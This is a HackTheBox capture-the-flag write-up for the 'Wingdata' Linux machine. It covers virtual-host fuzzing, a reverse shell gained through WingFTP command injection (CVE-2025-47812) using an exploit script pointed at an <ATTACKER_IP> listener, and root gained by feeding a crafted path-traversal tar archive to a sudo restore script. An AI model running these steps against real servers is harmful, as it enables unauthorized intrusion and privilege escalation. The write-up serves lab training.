# Wingdata

**Platform:** HackTheBox
**OS:** Linux
**Tags:** VHost Enumeration, CVE-2025-47812, WingFTP, Command Injection, sudo, Tar Path Traversal, OS Command Injection, RCE, Path Traversal, Privilege Escalation
**Date:** 2026-05-09

VHost enumeration finds a WingFTP server on a subdomain. CVE-2025-47812 command injection in WingFTP gives initial access. Root via a sudo Python restore script that extracts a crafted tar archive - tar's path traversal writes an arbitrary file as root.

## 1. Enumeration

Started with a service scan.

```bash
nmap -sC -sV wingdata.htb -Pn
```

Findings:
- 22/tcp - OpenSSH
- 80/tcp - HTTP, wingdata.htb main site

Port 80 referenced a domain in its response, indicating virtual hosting. Added wingdata.htb to /etc/hosts and fuzzed for subdomains.

## 2. VHost Discovery

```bash
ffuf -u http://wingdata.htb \
  -H 'Host: FUZZ.wingdata.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
```

- ftp - ftp.wingdata.htb, WingFTP Server web interface

Added ftp.wingdata.htb to /etc/hosts. Browsing to it confirmed WingFTP Server.

## 3. WingFTP RCE (CVE-2025-47812)

CVE-2025-47812 is a command injection vulnerability in WingFTP Server. The exploit delivers a reverse shell through an unsanitised parameter in the web interface.

```bash
nc -lvnp 4444
```

```bash
python3 exploit_CVE-2025-47812.py \
  --target http://ftp.wingdata.htb \
  --lhost <ATTACKER_IP> \
  --lport 4444
```

**Result:** Shell obtained. User flag retrieved.

## 4. PrivEsc: Tar Path Traversal via sudo restore script

Checked sudo permissions.

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/restore.py
```

`/opt/restore.py` accepts a tar archive and extracts it as root. tar doesn't sanitise paths by default - a crafted archive with a `../` path in the filename writes files outside the intended extraction directory. Used this to overwrite a privileged file as root.

```bash
# Craft malicious tar
python3 craft_tar.py

# Trigger extraction
sudo /usr/bin/python3 /opt/restore.py -b backup_888.tar
```

**Result:** Root shell obtained.

## 5. Flags

- User: `redacted`
- Root: `redacted`
